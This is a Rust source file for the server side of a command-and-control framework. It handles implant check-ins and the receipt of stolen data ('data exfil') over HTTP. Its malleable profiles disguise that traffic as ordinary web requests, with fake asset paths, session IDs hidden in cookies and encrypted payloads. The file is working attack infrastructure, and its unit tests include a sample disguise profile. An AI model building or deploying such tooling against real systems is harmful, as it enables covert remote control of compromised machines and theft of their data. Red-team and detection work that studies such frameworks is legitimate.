//! HTTP C2 handler with malleable profile integration.
//!
//! This module implements the HTTP-facing C2 handler that processes agent
//! checkins (GET) and task outputs (POST) through the malleable profile
//! transform pipeline.
//!
//! ## Request Flow
//!
//! **GET (agent checkin / task fetch):**
//! 1. Match the URI against the profile's `http_get.uri` list
//! 2. Extract the session ID from the configured delivery method
//! 3. Strip the client prepend/append and reverse the client transform
//! 4. Decrypt with the session key
//! 5. Queue any pending tasks
//! 6. Transform the tasking data through the server pipeline
//! 7. Send the response with the profile's Content-Type
//!
//! **POST (task output / data exfil):**
//! 1. Match the URI against the profile's `http_post.uri` list
//! 2. Extract the session ID from the configured delivery method
//! 3. Strip the client prepend/append and reverse the client transform
//! 4. Decrypt with the session key
//! 5. Process the task output
//! 6. Send a transformed acknowledgment response

use crate::auth;
use crate::malleable::{MultiProfileManager, TransactionTransformer};
use crate::state::{AgentEntry, AppState};
use axum::body::Bytes;
use axum::extract::State;
use axum::http::{HeaderMap, Response, StatusCode};
use axum::response::IntoResponse;
use axum::Router;
use common::{negotiate_protocol_version, Message, MIN_PROTOCOL_VERSION, PROTOCOL_VERSION};
use dashmap::{mapref::entry::Entry, DashMap};
use std::collections::{HashMap, VecDeque};
use std::net::IpAddr;
use std::sync::{Arc, Mutex};
use tokio::sync::mpsc;

struct HttpSession {
    connection_id: String,
    outbound_rx: mpsc::Receiver<Message>,
    outbound_queue: VecDeque<Message>,
    /// ECDH-derived crypto session (replaces static PSK once established).
    ecdh_session: Option<std::sync::Arc<common::CryptoSession>>,
    /// Server-side ECDH state used to produce the response header
    /// on the *first* reply after receiving the client's ECDH init.
    ecdh_handshake_pending: Option<String>,
}

/// Shared state for the HTTP C2 handler.
#[derive(Clone)]
pub struct HttpC2State {
    pub profile_manager: Arc<MultiProfileManager>,
    pub app_state: Arc<AppState>,
    /// Static PSK-derived crypto session (fallback when ECDH not established).
    crypto: Arc<common::CryptoSession>,
    /// Per-session HTTP transport state keyed by extracted session ID.
    sessions: Arc<DashMap<String, Arc<Mutex<HttpSession>>>>,
    /// Per-IP rate limiter for C2 requests.  More permissive than the auth
    /// limiter since legitimate agents poll frequently.
    pub c2_rate_limiter: Arc<auth::PerIpRateLimiter>,
}

impl HttpC2State {
    pub fn new(
        profile_manager: Arc<MultiProfileManager>,
        app_state: Arc<AppState>,
        c2_rate_limiter: Arc<auth::PerIpRateLimiter>,
    ) -> Self {
        let crypto = Arc::new(common::CryptoSession::from_shared_secret(
            app_state.agent_shared_secret.as_bytes(),
        ));
        Self {
            profile_manager,
            app_state,
            crypto,
            sessions: Arc::new(DashMap::new()),
            c2_rate_limiter,
        }
    }
}

/// Build an axum Router for the HTTP C2 handler.
///
/// Uses a catch-all fallback handler that dispatches based on the HTTP method
/// and matches the URI against loaded profile configurations.
pub fn build_router(state: HttpC2State) -> Router {
    Router::new()
        .fallback(dispatch_c2_request)
        .with_state(state)
}

/// Top-level dispatcher that extracts request components and delegates.
///
/// Enforces per-IP rate limiting before processing any C2 request.
async fn dispatch_c2_request(
    State(state): State<HttpC2State>,
    req: axum::extract::Request,
) -> axum::response::Response {
    // P1-16: Per-IP rate limiting — extract client IP and check quota.
    let client_ip = extract_client_ip_from_request(&req);
    if state.c2_rate_limiter.check(&client_ip).is_err() {
        return (
            StatusCode::TOO_MANY_REQUESTS,
            [(axum::http::header::CONTENT_TYPE, "text/plain")],
            "Too Many Requests",
        )
            .into_response();
    }

    let method = req.method().clone();
    let uri = req.uri().to_string();
    let path = req.uri().path().to_string();
    let headers = extract_headers(req.headers());
    let body = axum::body::to_bytes(req.into_body(), 16 * 1024 * 1024)
        .await
        .unwrap_or_default();

    match method.as_str() {
        "GET" => handle_get(&state, &path, &uri, &headers, &body).await,
        "POST" => handle_post(&state, &path, &uri, &headers, &body).await,
        _ => (
            StatusCode::METHOD_NOT_ALLOWED,
            [(axum::http::header::CONTENT_TYPE, "text/plain")],
            "Method Not Allowed",
        )
            .into_response(),
    }
}

/// Handle a GET request (agent checkin / task fetch).
///
/// 1. Match URI against http_get profiles
/// 2. Extract session ID from metadata delivery method
/// 3. Decode and strip client transforms from any body data
/// 4. Look up the session and queue pending tasks
/// 5. Transform the tasking response through the server pipeline
/// 6. Return with profile-appropriate Content-Type
async fn handle_get(
    state: &HttpC2State,
    path: &str,
    uri: &str,
    headers: &HashMap<String, String>,
    body: &[u8],
) -> axum::response::Response {
    // Step 1: Find the matching profile and transaction.
    let (profile_name, transformer) = match find_matching_get_transformer(state, path).await {
        Some(result) => result,
        None => {
            return (StatusCode::NOT_FOUND, "Not Found").into_response();
        }
    };

    // Step 2: Extract session ID from metadata.
    let session_id = match transformer.extract_metadata_from_headers(headers, uri, body) {
        Ok(id) => id,
        Err(e) => {
            tracing::debug!("GET {}: metadata extraction failed: {}", path, e);
            return (StatusCode::BAD_REQUEST, "Bad Request").into_response();
        }
    };

    // Step 3: Touch the session.
    let http_session = ensure_http_session(state, &session_id);

    // Process ECDH header (if present) and obtain response header value.
    let ecdh_response_header = {
        let mut guard = http_session.lock().unwrap_or_else(|p| p.into_inner());
        process_ecdh_header(state, &session_id, &mut guard, headers)
    };

    // Determine the crypto session (ECDH-derived or PSK fallback).
    let crypto = {
        let guard = http_session.lock().unwrap_or_else(|p| p.into_inner());
        session_crypto(state, &guard)
    };

    state.profile_manager.touch_session(&session_id).await;

    if !body.is_empty() {
        match transformer.transform_inbound(body) {
            Ok(decoded) => match crypto.decrypt(&decoded) {
                Ok(plaintext) => {
                    process_task_output(state, &session_id, &plaintext).await;
                }
                Err(e) => {
                    tracing::warn!(
                        "GET {}: decrypt failed for session '{}': {}",
                        path,
                        session_id,
                        e
                    );
                }
            },
            Err(e) => {
                tracing::warn!(
                    "GET {}: transform_inbound failed for session '{}': {}",
                    path,
                    session_id,
                    e
                );
            }
        }
    }

    tracing::debug!(
        "GET {} from agent session '{}' (profile '{}')",
        path,
        session_id,
        profile_name
    );

    // Step 4: Check for pending tasks.
    let task_data = match get_pending_task(state, &session_id).await {
        Some(data) => data,
        None => {
            // No tasks pending: return an actual empty body so the agent's
            // recv path can reliably treat this as an idle poll.
            let content_type = transformer
                .content_type()
                .unwrap_or("application/octet-stream");
            let mut resp = (
                StatusCode::OK,
                [(axum::http::header::CONTENT_TYPE, content_type)],
                Bytes::new(),
            )
                .into_response();
            if let Some(ref hdr) = ecdh_response_header {
                match axum::http::HeaderValue::from_str(hdr) {
                    Ok(value) => {
                        resp.headers_mut().insert(
                            axum::http::HeaderName::from_static(
                                common::forward_secrecy::ECDH_HEADER_NAME,
                            ),
                            value,
                        );
                    }
                    Err(e) => {
                        tracing::warn!("ECDH response header value invalid (not inserted): {e}");
                    }
                }
            }
            return resp;
        }
    };

    // Step 5: Transform the tasking data through the server pipeline.
    let encrypted_task_data = crypto.encrypt(&task_data);
    let response_body = transformer.transform_outbound(&encrypted_task_data, &session_id);

    // Step 6: Build the response with profile headers.
    let content_type = transformer
        .content_type()
        .unwrap_or("application/octet-stream");

    let mut builder = Response::builder()
        .status(StatusCode::OK)
        .header("Content-Type", content_type);

    // Add profile-configured headers.
    let profile_headers = transformer.build_headers(&session_id);
    for (key, value) in &profile_headers {
        if key.to_lowercase() != "content-type" {
            builder = builder.header(key.as_str(), value.as_str());
        }
    }

    // Add ECDH response header if handshake just completed.
    if let Some(ref hdr) = ecdh_response_header {
        builder = builder.header(common::forward_secrecy::ECDH_HEADER_NAME, hdr.as_str());
    }

    builder.body(axum::body::Body::from(response_body)).unwrap()
}

/// Handle a POST request (task output / data exfiltration).
///
/// 1. Match URI against http_post profiles
/// 2. Extract session ID from metadata delivery method
/// 3. Transform and decrypt the inbound data
/// 4. Process the task output
/// 5. Send a transformed acknowledgment response
async fn handle_post(
    state: &HttpC2State,
    path: &str,
    uri: &str,
    headers: &HashMap<String, String>,
    body: &[u8],
) -> axum::response::Response {
    // Step 1: Find the matching profile and transaction.
    let (profile_name, transformer) = match find_matching_post_transformer(state, path).await {
        Some(result) => result,
        None => {
            return (StatusCode::NOT_FOUND, "Not Found").into_response();
        }
    };

    // Step 2: Extract session ID from metadata.
    let session_id = match transformer.extract_metadata_from_headers(headers, uri, body) {
        Ok(id) => id,
        Err(e) => {
            tracing::debug!("POST {}: metadata extraction failed: {}", path, e);
            return (StatusCode::BAD_REQUEST, "Bad Request").into_response();
        }
    };

    // Step 3: Transform and decrypt the inbound data.
    let http_session = ensure_http_session(state, &session_id);

    // Process ECDH header (if present) and obtain response header value.
    let ecdh_response_header = {
        let mut guard = http_session.lock().unwrap_or_else(|p| p.into_inner());
        process_ecdh_header(state, &session_id, &mut guard, headers)
    };

    // Determine the crypto session (ECDH-derived or PSK fallback).
    let crypto = {
        let guard = http_session.lock().unwrap_or_else(|p| p.into_inner());
        session_crypto(state, &guard)
    };

    let decoded = match transformer.transform_inbound(body) {
        Ok(data) => data,
        Err(e) => {
            tracing::warn!(
                "POST {}: transform_inbound failed for session '{}': {}",
                path,
                session_id,
                e
            );
            return (StatusCode::BAD_REQUEST, "Bad Request").into_response();
        }
    };

    let plaintext = match crypto.decrypt(&decoded) {
        Ok(data) => data,
        Err(e) => {
            tracing::warn!(
                "POST {}: decrypt failed for session '{}': {}",
                path,
                session_id,
                e
            );
            return (StatusCode::BAD_REQUEST, "Bad Request").into_response();
        }
    };

    // Step 4: Touch the session and process the output.
    state.profile_manager.touch_session(&session_id).await;

    tracing::debug!(
        "POST {} from agent session '{}' (profile '{}', {} bytes)",
        path,
        session_id,
        profile_name,
        plaintext.len()
    );

    // Process the task output through the app state.
    process_task_output(state, &session_id, &plaintext).await;

    // Step 5: Send a transformed acknowledgment response.
    let ack = transformer.transform_outbound(b"ACK", &session_id);
    let content_type = transformer
        .content_type()
        .unwrap_or("application/octet-stream");

    let mut resp = (
        StatusCode::OK,
        [(axum::http::header::CONTENT_TYPE, content_type)],
        Bytes::from(ack),
    )
        .into_response();

    // Add ECDH response header if handshake just completed.
    if let Some(ref hdr) = ecdh_response_header {
        match axum::http::HeaderValue::from_str(hdr) {
            Ok(value) => {
                resp.headers_mut().insert(
                    axum::http::HeaderName::from_static(common::forward_secrecy::ECDH_HEADER_NAME),
                    value,
                );
            }
            Err(e) => {
                tracing::warn!("ECDH response header value invalid (not inserted): {e}");
            }
        }
    }

    resp
}

// ── Helper Functions ─────────────────────────────────────────────────────────

/// Extract header values into a HashMap.
fn extract_headers(headers: &HeaderMap) -> HashMap<String, String> {
    let mut map = HashMap::new();
    for (key, value) in headers {
        if let Ok(v) = value.to_str() {
            map.insert(key.to_string(), v.to_string());
        }
    }
    map
}

/// Extract client IP from the incoming C2 request.
///
/// Delegates to `auth::extract_client_ip` which checks `ConnectInfo`,
/// then `X-Forwarded-For`, then falls back to `127.0.0.1`.
/// Returns only the IP (discards the trust flag — the C2 path does not
/// use per-IP rate limiting).
fn extract_client_ip_from_request(req: &axum::extract::Request) -> IpAddr {
    auth::extract_client_ip(req).0
}

fn now_secs() -> u64 {
    std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .unwrap_or_default()
        .as_secs()
}

/// Return the appropriate crypto session for a given HTTP session:
/// - If ECDH has completed, use the derived session (forward secrecy).
/// - Otherwise fall back to the static PSK session.
fn session_crypto(
    state: &HttpC2State,
    http_session: &HttpSession,
) -> std::sync::Arc<common::CryptoSession> {
    http_session
        .ecdh_session
        .clone()
        .unwrap_or_else(|| state.crypto.clone())
}

/// Process the `X-ECDH-Pub` header from an agent request.
///
/// If present and valid, derives an ECDH session key and stores it on the
/// `HttpSession` for all subsequent encrypt/decrypt operations.  Returns
/// the response header value that the server must echo back so the agent
/// can complete its side of the handshake.
fn process_ecdh_header(
    state: &HttpC2State,
    session_id: &str,
    http_session: &mut HttpSession,
    headers: &HashMap<String, String>,
) -> Option<String> {
    let header_val = headers.get(common::forward_secrecy::ECDH_HEADER_NAME)?;

    // Skip if this session already completed ECDH.
    if http_session.ecdh_session.is_some() {
        return None;
    }

    let psk = state.app_state.agent_shared_secret.as_bytes();
    match common::forward_secrecy::HttpEcdhServerSession::new(psk, header_val) {
        Ok(server_ecdh) => {
            let response_header = server_ecdh.response_header_value();
            http_session.ecdh_session = Some(Arc::new(server_ecdh.into_session()));
            http_session.ecdh_handshake_pending = None; // cleared — session is ready
            tracing::info!("ECDH session established for HTTP agent '{}'", session_id);
            Some(response_header)
        }
        Err(e) => {
            tracing::warn!("ECDH handshake failed for session '{}': {}", session_id, e);
            None
        }
    }
}

fn ensure_http_session(state: &HttpC2State, session_id: &str) -> Arc<Mutex<HttpSession>> {
    match state.sessions.entry(session_id.to_string()) {
        Entry::Occupied(o) => o.get().clone(),
        Entry::Vacant(v) => {
            let connection_id = format!("http-{session_id}");
            let (tx, rx) = mpsc::channel::<Message>(64);

            let morph_seed = state.app_state.generate_unique_seed();
            state.app_state.assigned_seeds.insert(morph_seed);

            state.app_state.registry.insert(
                connection_id.clone(),
                AgentEntry {
                    connection_id: connection_id.clone(),
                    agent_id: session_id.to_string(),
                    hostname: "http".to_string(),
                    last_seen: now_secs(),
                    tx,
                    peer: format!("http/{session_id}"),
                    morph_seed,
                    text_hash: None,
                    mesh_certificate: None,
                    mesh_public_key: None,
                    compartment: None,
                    cert_identity: None,
                },
            );

            let session = Arc::new(Mutex::new(HttpSession {
                connection_id,
                outbound_rx: rx,
                outbound_queue: VecDeque::new(),
                ecdh_session: None,
                ecdh_handshake_pending: None,
            }));
            v.insert(session.clone());
            session
        }
    }
}

fn drain_outbound_queue(session: &mut HttpSession) {
    while let Ok(msg) = session.outbound_rx.try_recv() {
        session.outbound_queue.push_back(msg);
    }
}

fn enqueue_outbound_message(state: &HttpC2State, session_id: &str, msg: Message) {
    let session = ensure_http_session(state, session_id);
    let mut guard = match session.lock() {
        Ok(g) => g,
        Err(poisoned) => poisoned.into_inner(),
    };
    guard.outbound_queue.push_back(msg);
    if let Some(mut entry) = state.app_state.registry.get_mut(&guard.connection_id) {
        entry.last_seen = now_secs();
    }
}

/// Find a matching GET transformer for the given URI path.
async fn find_matching_get_transformer(
    state: &HttpC2State,
    path: &str,
) -> Option<(String, TransactionTransformer)> {
    let names = state.profile_manager.profile_names().await;
    for name in &names {
        if let Ok(transformer) = state
            .profile_manager
            .get_transformer(name, "http_get")
            .await
        {
            if transformer.matches_uri(path) {
                return Some((name.clone(), transformer));
            }
        }
    }
    None
}

/// Find a matching POST transformer for the given URI path.
async fn find_matching_post_transformer(
    state: &HttpC2State,
    path: &str,
) -> Option<(String, TransactionTransformer)> {
    let names = state.profile_manager.profile_names().await;
    for name in &names {
        if let Ok(transformer) = state
            .profile_manager
            .get_transformer(name, "http_post")
            .await
        {
            if transformer.matches_uri(path) {
                return Some((name.clone(), transformer));
            }
        }
    }
    None
}

/// Get pending task data for a session.
async fn get_pending_task(state: &HttpC2State, session_id: &str) -> Option<Vec<u8>> {
    let session = ensure_http_session(state, session_id);
    let maybe_msg = {
        let mut guard = match session.lock() {
            Ok(g) => g,
            Err(poisoned) => poisoned.into_inner(),
        };
        drain_outbound_queue(&mut guard);
        guard.outbound_queue.pop_front()
    };

    let msg = maybe_msg?;
    match bincode::serde::encode_to_vec(&msg, bincode::config::legacy()) {
        Ok(v) => Some(v),
        Err(e) => {
            tracing::warn!(
                "failed to serialize pending HTTP task for session '{}': {}",
                session_id,
                e
            );
            None
        }
    }
}

/// Process task output received from an agent.
async fn process_task_output(state: &HttpC2State, session_id: &str, output: &[u8]) {
    tracing::info!(
        "received {} bytes of task output from session '{}'",
        output.len(),
        session_id
    );

    let msg: Message = match bincode::serde::decode_from_slice(output, bincode::config::legacy())
        .map(|(v, _)| v)
    {
        Ok(m) => m,
        Err(e) => {
            tracing::warn!(
                "failed to deserialize HTTP C2 payload for session '{}': {}",
                session_id,
                e
            );
            return;
        }
    };

    match msg {
        Message::Heartbeat {
            agent_id,
            status,
            timestamp: _,
            mesh_public_key,
        } => {
            let session = ensure_http_session(state, session_id);
            let connection_id = {
                let guard = match session.lock() {
                    Ok(g) => g,
                    Err(poisoned) => poisoned.into_inner(),
                };
                guard.connection_id.clone()
            };

            if let Some(mut entry) = state.app_state.registry.get_mut(&connection_id) {
                entry.agent_id = agent_id;
                entry.hostname = status;
                entry.last_seen = now_secs();
                entry.mesh_public_key = mesh_public_key;
            }
        }
        Message::VersionHandshake { version } => {
            match negotiate_protocol_version(version) {
                Some(negotiated) => {
                    if negotiated != version {
                        tracing::info!(
                            session_id = %session_id,
                            agent_version = version,
                            negotiated_version = negotiated,
                            "HTTP C2 protocol version negotiated (agent downgrade)"
                        );
                    } else {
                        tracing::debug!(
                            session_id = %session_id,
                            version,
                            "HTTP C2 version handshake completed"
                        );
                    }
                    enqueue_outbound_message(
                        state,
                        session_id,
                        Message::VersionHandshake {
                            version: negotiated,
                        },
                    );
                }
                None => {
                    tracing::warn!(
                        session_id = %session_id,
                        agent_version = version,
                        min_supported = MIN_PROTOCOL_VERSION,
                        "HTTP C2 agent protocol version too old; rejecting"
                    );
                    // Send our version so the agent knows what we expect, then
                    // mark the session for teardown by the poll handler.
                    enqueue_outbound_message(
                        state,
                        session_id,
                        Message::VersionHandshake {
                            version: PROTOCOL_VERSION,
                        },
                    );
                }
            }
        }
        Message::TaskResponse {
            task_id, result, ..
        } => {
            if let Some((_, sender)) = state.app_state.pending.remove(&task_id) {
                if let Err(e) = sender.send(result) {
                    tracing::warn!(%task_id, "failed to deliver TaskResponse to operator (disconnected?): {e:?}");
                }
            } else {
                tracing::debug!(%task_id, "received TaskResponse with no pending waiter");
            }
        }
        Message::AuditLog(ev) => {
            state.app_state.audit.record(ev);
        }
        other => {
            tracing::debug!(
                session_id = %session_id,
                message = ?other,
                "ignoring HTTP C2 agent->server message variant"
            );
        }
    }
}

// ── Tests ────────────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;
    use crate::malleable::MalleableProfile;

    fn test_profile_toml() -> &'static str {
        r#"
[profile]
name = "test_http"
author = "tester"
description = "Test HTTP profile"

[profile.global]
user_agent = "TestAgent/1.0"
jitter = 10
sleep_time = 30

[profile.ssl]
enabled = false

[profile.http_get]
uri = ["/api/v1/data", "/static/asset.js"]
verb = "GET"

[profile.http_get.headers]
"Accept" = "application/json"
"Content-Type" = "text/html"

[profile.http_get.client]
prepend = "HEADER_"
append = "_FOOTER"
transform = "base64"

[profile.http_get.server]
prepend = "RESP_"
append = "_END"
transform = "base64"

[profile.http_get.metadata]
delivery = "cookie"
key = "session"
transform = "base64"

[profile.http_post]
uri = ["/api/v1/upload"]
verb = "POST"

[profile.http_post.headers]
"Content-Type" = "application/octet-stream"

[profile.http_post.client]
prepend = ""
append = ""
transform = "base64"

[profile.http_post.server]
prepend = ""
append = ""
transform = "none"

[profile.http_post.metadata]
delivery = "header"
key = "X-Session"
transform = "base64"

[profile.dns]
enabled = false
"#
    }

    #[test]
    fn test_transform_outbound_server_pipeline() {
        let profile = MalleableProfile::from_toml(test_profile_toml()).unwrap();
        let get_cfg = profile.http_get.as_ref().unwrap().clone();
        let transformer = TransactionTransformer::new(get_cfg);

        let data = b"task data for agent";
        let outbound = transformer.transform_outbound(data, "test-session");
        assert!(outbound.starts_with(b"RESP_"));
        assert!(outbound.ends_with(b"_END"));

        // Decode to verify round-trip.
        let decoded = transformer.decode_server(&outbound).unwrap();
        assert_eq!(decoded, data);
    }

    #[test]
    fn test_transform_inbound_client_pipeline() {
        let profile = MalleableProfile::from_toml(test_profile_toml()).unwrap();
        let get_cfg = profile.http_get.as_ref().unwrap().clone();
        let transformer = TransactionTransformer::new(get_cfg);

        let data = b"agent output data";
        let encoded = transformer.encode_client(data);
        let decoded = transformer.transform_inbound(&encoded).unwrap();
        assert_eq!(decoded, data);
    }

    #[test]
    fn test_transform_inbound_error_on_bad_prepend() {
        let profile = MalleableProfile::from_toml(test_profile_toml()).unwrap();
        let get_cfg = profile.http_get.as_ref().unwrap().clone();
        let transformer = TransactionTransformer::new(get_cfg);

        // Data without the expected prepend.
        let bad_data = b"no_header_here";
        let result = transformer.transform_inbound(bad_data);
        assert!(result.is_err());
    }

    #[test]
    fn test_encode_decode_metadata() {
        let profile = MalleableProfile::from_toml(test_profile_toml()).unwrap();
        let get_cfg = profile.http_get.as_ref().unwrap().clone();
        let transformer = TransactionTransformer::new(get_cfg);

        let session_id = "abc-123-def";
        let encoded = transformer.encode_metadata(session_id);
        let decoded = transformer.decode_metadata(&encoded).unwrap();
        assert_eq!(decoded, session_id);
    }

    #[test]
    fn test_matches_uri() {
        let profile = MalleableProfile::from_toml(test_profile_toml()).unwrap();
        let get_cfg = profile.http_get.as_ref().unwrap().clone();
        let transformer = TransactionTransformer::new(get_cfg);

        assert!(transformer.matches_uri("/api/v1/data"));
        assert!(transformer.matches_uri("/static/asset.js"));
        assert!(transformer.matches_uri("/api/v1/data?foo=bar"));
        assert!(!transformer.matches_uri("/api/v2/data"));
        assert!(!transformer.matches_uri("/login"));
    }

    #[test]
    fn test_extract_metadata_from_cookie() {
        let profile = MalleableProfile::from_toml(test_profile_toml()).unwrap();
        let get_cfg = profile.http_get.as_ref().unwrap().clone();
        let transformer = TransactionTransformer::new(get_cfg);

        let session_id = "test-session-42";
        let encoded = transformer.encode_metadata(session_id);

        let mut headers = HashMap::new();
        headers.insert("Cookie".to_string(), format!("session={}; path=/", encoded));

        let result = transformer
            .extract_metadata_from_headers(&headers, "/api/v1/data", &[])
            .unwrap();
        assert_eq!(result, session_id);
    }

    #[test]
    fn test_extract_metadata_from_header() {
        let profile = MalleableProfile::from_toml(test_profile_toml()).unwrap();
        let post_cfg = profile.http_post.as_ref().unwrap().clone();
        let transformer = TransactionTransformer::new(post_cfg);

        let session_id = "post-session-99";
        let encoded = transformer.encode_metadata(session_id);

        let mut headers = HashMap::new();
        headers.insert("X-Session".to_string(), encoded);

        let result = transformer
            .extract_metadata_from_headers(&headers, "/api/v1/upload", &[])
            .unwrap();
        assert_eq!(result, session_id);
    }
}
